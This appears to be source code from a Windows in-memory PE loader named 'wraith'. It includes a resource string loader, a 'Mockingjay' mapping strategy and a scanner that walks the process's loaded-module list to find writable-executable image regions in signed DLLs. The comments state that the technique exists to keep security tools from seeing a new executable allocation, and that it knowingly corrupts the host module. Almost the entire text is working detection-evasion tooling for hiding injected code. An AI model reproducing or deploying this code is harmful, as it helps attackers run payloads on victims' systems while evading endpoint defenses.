wraith_status_t wraith_load_string(wraith_handle_t h, uint32_t id,
  uint16_t language,
  wchar_t *out_buffer, size_t buf_chars,
  size_t *out_chars)
{
  if (out_chars) {
  *out_chars = 0;
  }
  if (buf_chars == 0 || !out_buffer) {
  return WRAITH_E_BUFFER_TOO_SMALL;
  }
  out_buffer[0] = 0;

  struct wr_ctx *ctx = NULL;
  wraith_status_t rc = wr_ctx_check(h, &ctx);
  if (rc != WRAITH_OK) {
  return rc;
  }

  PIMAGE_RESOURCE_DATA_ENTRY block =
  wr_resource_find_entry(ctx, MAKEINTRESOURCEA((id >> 4) + 1),
  (const void *)(uintptr_t)6 /* RT_STRING */,
  language);
  if (!block) {
  return WRAITH_E_RES_NOT_FOUND;
  }

  PIMAGE_RESOURCE_DIR_STRING_U entry =
  (PIMAGE_RESOURCE_DIR_STRING_U)(ctx->image_base + block->OffsetToData);

  /* Skip to the entry within the bundle of 16. */
  uint32_t skip = id & 0x0f;
  while (skip--) {
  size_t step = (entry->Length + 1) * sizeof(wchar_t);
  entry = (PIMAGE_RESOURCE_DIR_STRING_U)((uint8_t *)entry + step);
  }
  if (entry->Length == 0) {
  return WRAITH_E_RES_NAME_NOT_FOUND;
  }

  size_t copy = entry->Length;
  if (copy >= buf_chars) {
  copy = buf_chars - 1;
  }
  memcpy(out_buffer, entry->NameString, copy * sizeof(wchar_t));
  out_buffer[copy] = 0;

  if (out_chars) {
  *out_chars = copy;
  }
  return WRAITH_OK;
}


/* ==========================================================================
 * src/mapping/map_mockingjay.c
 * ========================================================================== */

/*
 * src/mapping/map_mockingjay.c
 *
 * Mockingjay mapping strategy. Reuses a `MEM_IMAGE+RWX` region
 * already present in the process - typically a `.text` section of
 * a signed DLL that ships writable for legitimate self-modification
 * reasons (msys-2.0, certain SDK shims). Because no allocation
 * happens, the "new RWX page in process" IOC fires zero times.
 *
 * Trade-offs:
 *  - The region's underlying module is permanently corrupted for
 *  the host process's lifetime; if anything else in the process
 *  calls into the host's overlapping bytes, it crashes.
 *  - The region remains MEM_IMAGE backed by the host file.
 *  Detectors that hash the on-disk file vs in-memory bytes
 *  still detect.
 */





#include <stdlib.h>
#include <windows.h>

typedef struct mockingjay_state {
  void  *base;
  size_t available;
} mockingjay_state;

static wraith_status_t mj_reserve(struct wr_ctx *ctx, size_t size, void **out_base)
{
  if (!ctx || !out_base) {
  return WRAITH_E_NULL_ARG;
  }

  mockingjay_state *st = (mockingjay_state *)calloc(1, sizeof(*st));
  if (!st) {
  return wr_ctx_fail(ctx, WRAITH_E_OOM, "mockingjay: alloc state");
  }

  void  *base = NULL;
  size_t avail = 0;
  wraith_status_t rc = wr_mockingjay_find_region(size, &base, &avail);
  if (rc != WRAITH_OK) {
  free(st);
  return wr_ctx_fail(ctx, WRAITH_E_MAP_NO_HOST_DLL,
  "mockingjay: no MEM_IMAGE+RWX region "
  ">= %zu bytes available", size);
  }

  st->base  = base;
  st->available = avail;
  ctx->map_state = st;
  *out_base = base;
  return WRAITH_OK;
}

static wraith_status_t mj_commit(struct wr_ctx *ctx, void *addr, size_t size,
  wraith_prot_t initial_prot)
{
  /* Region is already RWX-backed by the host. Nothing to do. */
  (void)ctx; (void)addr; (void)size; (void)initial_prot;
  return WRAITH_OK;
}

static wraith_status_t mj_protect(struct wr_ctx *ctx, void *addr, size_t size,
  wraith_prot_t new_prot)
{
  /* Honor the loader's request to flip per-section protections;
  * even though the region was RWX it's good hygiene to demote
  * non-code sections to R/RW after copy. */
  if (!ctx || !addr || size == 0 || !ctx->rt_ops) {
  return WRAITH_E_NULL_ARG;
  }
  unsigned w32 = wr_prot_to_win32(new_prot);
  if (!w32) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_RWX_LEAK,
  "mockingjay: rejected RWX in protect");
  }
  unsigned old = 0;
  int rc = ctx->rt_ops->nt_protect(addr, size, w32, &old);
  if (rc != 0) {
  return wr_ctx_fail(ctx, WRAITH_E_MAP_PROTECT_FAILED,
  "mockingjay: NtProtect -> 0x%x",
  (unsigned)rc);
  }
  if (new_prot & (WRAITH_PROT_RX | WRAITH_PROT_RXC)) {
  ctx->rt_ops->nt_flush_icache(addr, size);
  }
  return WRAITH_OK;
}

static wraith_status_t mj_release(struct wr_ctx *ctx)
{
  /* Critical: we do NOT call NtFreeVirtualMemory or NtUnmapView
  * here - the host module owns this memory and the OS would
  * destabilize if we unmapped it. We simply leave the (now
  * scrambled) bytes in place. The host's MEM_IMAGE region
  * persists exactly as before. */
  (void)ctx;
  return WRAITH_OK;
}

static void mj_destroy(struct wr_ctx *ctx)
{
  if (!ctx) return;
  free(ctx->map_state);
  ctx->map_state = NULL;
}

const struct wr_map_ops wr_map_ops_mockingjay = {
  .name  = "mockingjay",
  .reserve = mj_reserve,
  .commit  = mj_commit,
  .protect = mj_protect,
  .release = mj_release,
  .destroy = mj_destroy,
};


/* ==========================================================================
 * src/mapping/map_mockingjay_scanner.c
 * ========================================================================== */

/*
 * src/mapping/map_mockingjay_scanner.c
 *
 * Implementation. Walks PEB.Ldr.InMemoryOrderModuleList directly
 * (avoids `EnumProcessModules` so we don't introduce a psapi
 * dependency in the runtime path). For each module we walk
 * `VirtualQuery` from base to base+SizeOfImage, looking for a
 * contiguous span where every probed sub-region has
 * `Type == MEM_IMAGE` and `Protect & PAGE_EXECUTE_READWRITE`.
 *
 * Wine note: wine 9.0's standard module set generally does NOT
 * ship `.text` as `PAGE_EXECUTE_READWRITE`; the scanner will
 * usually return WRAITH_E_MAP_NO_HOST_DLL on a stock wine prefix.
 * Real Windows hosts where the technique applies (msys2 binaries,
 * some MSI installers) do have such regions. The integration test
 * skips gracefully when no candidate is present.
 */

#include <stddef.h>
#include <stdint.h>
#include <windows.h>
#include <winternl.h>

/* MinGW's <winternl.h> declares only InMemoryOrderModuleList; we
 * mirror the layout so we can reach the link list head and the
 * LDR_DATA_TABLE_ENTRY fields beyond it. Stable Win10 1809..Win11. */
typedef struct mj_peb_ldr_data {
  ULONG  Length;
  BOOLEAN  Initialized;
  PVOID  SsHandle;
  LIST_ENTRY  InLoadOrderModuleList;  /* +0x10 */
  LIST_ENTRY  InMemoryOrderModuleList;  /* +0x20 */
  LIST_ENTRY  InInitializationOrderModuleList;  /* +0x30 */
} mj_peb_ldr_data;

typedef struct mj_ldr_entry {
  LIST_ENTRY  InLoadOrderLinks;
  LIST_ENTRY  InMemoryOrderLinks;
  LIST_ENTRY  InInitializationOrderLinks;
  PVOID  DllBase;
  PVOID  EntryPoint;
  ULONG  SizeOfImage;
  UNICODE_STRING FullDllName;
  UNICODE_STRING BaseDllName;
} mj_ldr_entry;

#define MJ_FROM_INMEM(p) \
  ((mj_ldr_entry *)((uint8_t *)(p) - offsetof(mj_ldr_entry, InMemoryOrderLinks)))

static int region_is_rwx_image(const MEMORY_BASIC_INFORMATION *mbi)
{
  if (mbi->State != MEM_COMMIT)  return 0;
  if (mbi->Type  != MEM_IMAGE)  return 0;
  /* Match if the page has ALL of read+write+execute set. */
  DWORD p = mbi->Protect & 0xFF;
  return (p == PAGE_EXECUTE_READWRITE) ||
  (p == PAGE_EXECUTE_WRITECOPY);
}

wraith_status_t wr_mockingjay_find_region(size_t needed_bytes,
  void **out_base,
  size_t *out_size)
{
  if (!out_base) {
  return WRAITH_E_NULL_ARG;
  }
  *out_base = NULL;
  if (out_size) *out_size = 0;
  if (needed_bytes == 0) {
  return WRAITH_E_INVALID_OPTIONS;
  }

  PPEB peb = (PPEB)NtCurrentTeb()->ProcessEnvironmentBlock;
  if (!peb || !peb->Ldr) {
  return WRAITH_E_RT_PEB_WALK_FAILED;
  }
  mj_peb_ldr_data *ldr = (mj_peb_ldr_data *)peb->Ldr;
  PLIST_ENTRY head = &ldr->InMemoryOrderModuleList;
  PLIST_ENTRY cur  = head->Flink;

  while (cur && cur != head) {
  mj_ldr_entry *e = MJ_FROM_INMEM(cur);
  cur = cur->Flink;
  if (!e->DllBase || e->SizeOfImage == 0) continue;

  uint8_t *mod_base = (uint8_t *)e->DllBase;
  uint8_t *mod_end  = mod_base + e->SizeOfImage;

  /* Walk every distinct VA range inside the module. */
  uint8_t *p = mod_base;
  while (p < mod_end) {
  MEMORY_BASIC_INFORMATION mbi = {0};
  if (VirtualQuery(p, &mbi, sizeof(mbi)) == 0) {
  break;
  }
  uint8_t *region_end = (uint8_t *)mbi.BaseAddress + mbi.RegionSize;
  if (region_is_rwx_image(&mbi) && mbi.RegionSize >= needed_bytes) {
  *out_base = mbi.BaseAddress;
  if (out_size) *out_size = (size_t)mbi.RegionSize;
  return WRAITH_OK;
  }
  if (region_end <= p) {
  break;  /* defensive */
  }
  p = region_end;
  }
  }

  return WRAITH_E_MAP_NO_HOST_DLL;
}
